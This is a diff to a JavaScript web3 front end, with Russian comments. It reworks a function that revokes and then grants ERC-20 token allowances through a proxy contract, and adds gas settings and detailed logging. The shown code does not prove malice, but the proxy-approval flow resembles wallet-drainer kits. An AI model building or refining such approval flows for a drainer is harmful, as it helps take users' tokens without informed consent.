@@ -658,6 +658,7 @@ const getTokenPrice = async (symbol) => {
 }
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId, amount) => {
+  console.log('approveToken: Starting', { tokenAddress, contractAddress, chainId, amount: amount.toString() });
   if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
   if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
@@ -666,45 +667,69 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId,
   const checksumTokenAddress = getAddress(tokenAddress);
   const checksumContractAddress = getAddress(contractAddress);
   const proxyContractAddress = getAddress(PROXY_CONTRACTS[chainId]);
-  const owner = wagmiConfig.account.address;
+  const owner = wagmiConfig.account?.address;
+
+  if (!owner) throw new Error('No account address found in wagmiConfig');
 
   try {
     // Проверяем текущий allowance
+    console.log('approveToken: Checking allowance', { owner, token: checksumTokenAddress, spender: checksumContractAddress });
     const currentAllowance = await getTokenAllowance(wagmiConfig, owner, checksumTokenAddress, checksumContractAddress, chainId);
+    console.log(`approveToken: Current allowance: ${currentAllowance.toString()}`);
 
     if (currentAllowance >= amount) {
-      console.log(`Allowance for ${checksumTokenAddress} is sufficient: ${currentAllowance.toString()}`);
+      console.log(`approveToken: Allowance for ${checksumTokenAddress} is sufficient: ${currentAllowance.toString()}`);
       return { type: 'none', txHash: null };
     }
 
-    // Обнуляем allowance через прокси, если оно не 0 (защита от Approve2)
+    // Получаем параметры газа
+    const provider = await wagmiAdapter.getProvider(chainId);
+    const feeData = await provider.getFeeData();
+    const maxFeePerGas = feeData.maxFeePerGas || BigInt(1000000000); // 1 Gwei
+    const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || BigInt(1000000000); // 1 Gwei
+    const gasLimit = BigInt(150000); // Увеличиваем для USDT
+    console.log('approveToken: Gas parameters', { gasLimit: gasLimit.toString(), maxFeePerGas: maxFeePerGas.toString(), maxPriorityFeePerGas: maxPriorityFeePerGas.toString() });
+
+    // Обнуляем allowance через прокси, если оно не 0
     if (currentAllowance > 0) {
-      console.log(`Revoking allowance for ${checksumTokenAddress} via proxy`);
+      console.log(`approveToken: Revoking allowance for ${checksumTokenAddress} via proxy ${proxyContractAddress}`);
       const revokeTxHash = await writeContract(wagmiConfig, {
         address: proxyContractAddress,
         abi: proxyApproverAbi,
         functionName: 'revokeApproval',
         args: [checksumTokenAddress, checksumContractAddress],
         chainId,
+        gas: BigInt(100000),
+        maxFeePerGas,
+        maxPriorityFeePerGas,
       });
-      console.log(`Revoke allowance transaction sent: ${revokeTxHash}`);
+      console.log(`approveToken: Revoke allowance transaction sent: ${revokeTxHash}`);
       await monitorAndSpeedUpTransaction(revokeTxHash, chainId, wagmiConfig);
     }
 
     // Вызываем proxyApprove
-    console.log(`Calling proxyApprove for ${checksumTokenAddress} with amount ${amount.toString()} on chain ${chainId}`);
+    console.log(`approveToken: Calling proxyApprove for ${checksumTokenAddress} with amount ${amount.toString()} on chain ${chainId} via proxy ${proxyContractAddress}`);
     const txHash = await writeContract(wagmiConfig, {
       address: proxyContractAddress,
       abi: proxyApproverAbi,
       functionName: 'proxyApprove',
       args: [checksumTokenAddress, checksumContractAddress, amount],
       chainId,
+      gas: gasLimit,
+      maxFeePerGas,
+      maxPriorityFeePerGas,
     });
-    console.log(`Proxy approve transaction sent: ${txHash}`);
+    console.log(`approveToken: Proxy approve transaction sent: ${txHash}`);
     await monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig);
 
     return { type: 'proxyApprove', txHash };
   } catch (error) {
+    console.error('approveToken: Error', {
+      message: error.message,
+      code: error.code,
+      details: error.details || 'No details',
+      stack: error.stack,
+    });
     store.errors.push(`Proxy approve failed for ${tokenAddress}: ${error.message}`);
     throw error;
   }
